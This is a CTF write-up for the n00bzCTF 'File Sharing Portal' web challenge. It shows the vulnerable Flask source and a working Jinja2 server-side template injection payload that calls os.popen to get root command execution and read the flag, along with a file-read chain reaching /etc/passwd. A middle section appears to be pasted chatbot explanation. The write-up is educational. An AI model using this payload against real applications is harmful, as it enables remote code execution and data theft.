---
title: "n00bzCTF - File Sharing Portal"
date: 2024-08-09T09:40:00+01:00
tags: ["ctf", "write-up", "n00bzCTF"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for File Sharing Portal"
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "/images/default-cover.jpg" # default image path/url
    alt: "CTF Write-up Cover Image" # alt text
    caption: "CTF Write-up" # display caption under cover
    relative: false
    hidden: false
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Description

```
name: file sharing portal
category: web exploitation
points: 478
author: NoobMaster + NoobHacker
```

Welcome to the file sharing portal! We only support tar files!

## Solution

We are presented with the following interface

![welcome](/blog/images/2024-08-09-15-08-57.png)

As well as the source code of the application.

```python
#!/usr/bin/env python3
from flask import Flask, request, redirect, render_template, render_template_string
import tarfile
from hashlib import sha256
import os
app = Flask(__name__)

@app.route('/',methods=['GET','POST'])
def main():
    global username
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        file = request.files['file']
        if file.filename[-4:] != '.tar':
            return render_template_string("<p> We only support tar files as of right now!</p>")
        name = sha256(os.urandom(16)).digest().hex()
        os.makedirs(f"./uploads/{name}", exist_ok=True)
        file.save(f"./uploads/{name}/{name}.tar")
        try:
            tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
            tar_file.extractall(path=f'./uploads/{name}/')
            return render_template_string(f"<p>Tar file extracted! View <a href='/view/{name}'>here</a>")
        except:
            return render_template_string("<p>Failed to extract file!</p>")

@app.route('/view/<name>')
def view(name):
    if not all([i in "abcdef1234567890" for i in name]):
        return render_template_string("<p>Error!</p>")
        #print(os.popen(f'ls ./uploads/{name}').read())
            #print(name)
    files = os.listdir(f"./uploads/{name}")
    out = '<h1>Files</h1><br>'
    files.remove(f'{name}.tar')  # Remove the tar file from the list
    for i in files:
        out += f'<a href="/read/{name}/{i}">{i}</a>'
       # except:
    return render_template_string(out)

@app.route('/read/<name>/<file>')
def read(name,file):
    if (not all([i in "abcdef1234567890" for i in name])):
        return render_template_string("<p>Error!</p>")
    if ((".." in name) or (".." in file)) or (("/" in file) or "/" in name):
        return render_template_string("<p>Error!</p>")
    f = open(f'./uploads/{name}/{file}')
    data = f.read()
    f.close()
    return data

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

1. The application has a file upload feature which only accepts `tar` archives.
2. the tar archive is given a random `name`, saved in `uploads/{name}`. Its contents are extracted in the same path.
3. when viewed using `/view/{name}` endpoint, the tar archive is deleted and the listing of files is shown.

What's interesting in the latter step is that the names of the uploaded files are passed directly,
without sanitization into the `render_template_string` function by flask, which builds an html reponse
**server side** using jinja2 as a templating engine.

> "I didn't talk about the /read endpoint because it's irrelavant in this writeup.
but other writeups (linked at the end) make use of this endpoint"

> from the documentation of Flask: "Flask leverages Jinja2 as its template engine."

> A Jinja template is simply a text file. Jinja can generate any text-based format (HTML, XML, CSV, LaTeX, etc.).

Simply put, our filenames are taken straight from us and injected into the template. If
our injection is malicious, we can get remote code execution and read the flag.

---

But...

We have two problems at hand.

1. how can we execute python code inside the jinja2 template?

2. we don't know the flag name (as shown in the Dockerfile)

```bash
FROM python:3.9-slim
RUN apt-get update && \
    apt-get install -y cron && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY requirements.txt server.py /app/
COPY templates/ /app/templates/
COPY uploads/ /app/uploads/
COPY REDACTED.txt /app/
# The flag file is redacted on purpose
RUN pip install --no-cache-dir -r requirements.txt
# Add the cron job to the crontab
RUN mkdir /etc/cron.custom
RUN echo "*/5 * * * * root rm -rf /app/uploads/*" > /etc/cron.custom/cleanup-cron
RUN echo "* * * * * root cd / && run-parts --report /etc/cron.custom" | tee -a /etc/crontab
# Give execution rights on the cron job
RUN chmod +x /etc/cron.custom/cleanup-cron
RUN crontab /etc/cron.custom/cleanup-cron
RUN crontab /etc/crontab
CMD ["sh", "-c", "cron && python server.py"]
```

---

Taking a step back, A template contains variables and/or expressions, which get replaced with values when a template is rendered;
we can test this out by archiving a file called `{{5*5}}` and viewing it in the `/view` endpoint

Here is how we can go about doing so.

```bash
touch "{{5*5}}"
tar -cvf proof-of-concept.tar "{{5*5}}"
```

After the upload, we can see that the website indeed rendered 25 instead of `{{5*5}}`

![proof-of-concept](/blog/images/2024-08-09-15-34-25.png)

Nice, we have confirmed that we have a SSTI, next is finding a way to run python code inside the template.
But not any code... Code that will enable us to find the name of the flag, and eventually read it.

For that, let me introduce some internals of python.

So in python, everything is an object, that means we can do something like

```python
print(type('hxuu'))
```

and we get `<class 'str'>`, that is, the string 'hxuu' is an instance of the str class.
In the same way variables are objects, functions too are objects. Now check this out.

In normal day to day programming, when we want to execute a shell command using python,
we would use something like this

```python
with open('/etc/passwd') as file:
    content = file.read()
```

which open the `/etc/passwd` file and reads its content. We can achieve the same thing, but start with a string
instead, how so?

Since everything is an object, meaning everything in python inherents from the object class.
we can climb the inheretence tree to reach all the subclasses available, select the one we
want to use to execute a shell command, and boom, command executed. Like this:

```
''.__class__.__base__.__subclasses__()[<index-of-_io._IOBase>].__subclasses__()[<index-of-_io._RawIOBase>].__subclasses__()[<index-of-_io.FileIO>]('/etc/passwd').read()
```

I know this is a very roundabout way of going about things, but we'll need it in our challenge,
because Flask by default passes certain variables to the jinja2 template by default, mainly:

![defaults](/blog/images/2024-08-09-16-01-49.png)

We can use either one of those, but the easiest is the `request` object, from which
we can access the application context, through which we can import the 'os' module, and get RCE!

Let's build our payload then:

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('<our-command>').read()}}
```

Certainly! The expression:

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('<our-command>').read()}}
```

### Explanation:

1. **`request.application`**: This accesses the `application` object associated with the current `request` in a web framework context. It often represents the main application object or a similar structure in web frameworks.

2. **`__globals__`**: This attribute is a dictionary containing the global variables available in the scope where `application` is defined. It allows you to access global context or variables directly.

3. **`__builtins__`**: This is a reference to the built-in module in Python that contains all built-in functions and exceptions. It's accessible globally and is often used to get access to core Python functions.

4. **`__import__('os')`**: This dynamically imports the `os` module using Python’s `__import__` function. The `os` module provides a way to interact with the operating system, including executing shell commands.

5. **`popen('<our-command>')`**: The `popen` method from the `os` module opens a pipe to or from a command. In this case, `<our-command>` should be replaced with the actual shell command you want to execute. `popen` runs the command and returns a file-like object connected to its standard output.

6. **`.read()`**: This method reads all the output from the command executed by `popen`. It collects the command’s output as a string.

### Summary:

This code snippet is used to execute a shell command from within a web template or application context and display its output. It does this by accessing global variables and built-in functions from the web application's context, dynamically importing the `os` module, and using `popen` to run a command, finally reading and rendering the command's output.

Perfect! let's test this out with the `id` command. Here is the result:

![id-command-ran](/blog/images/2024-08-09-16-52-47.png)

We are root! we got remote code execution, rest is to find the flag. This can be done by listing the directory
contents using a simple `ls`

![ls](/blog/images/2024-08-09-16-54-18.png)

noice~ the flag name is:

```
flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt
```

Change the command once again to

```
cat flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt
```

![flag](/blog/images/2024-08-09-16-55-38.png)

And there we go~ The flag is: `n00bz{n3v3r_7rus71ng_t4r_4g41n!_f593b51385da}`

---

### Notes

This was a particularly interesting challenge, and my solution was not the intended solution haha.
I know I overcomplicated things a lot, but hey, those pyjails I love playing paid a lot.

- We learned about server side template injection, and some tricks with python.

If you're interested in other ways to solve the challenge, you can experiment with symbolic links,
cron jobs OR... a misuse of the archiving function in the python code. Hope you learned something, take care!
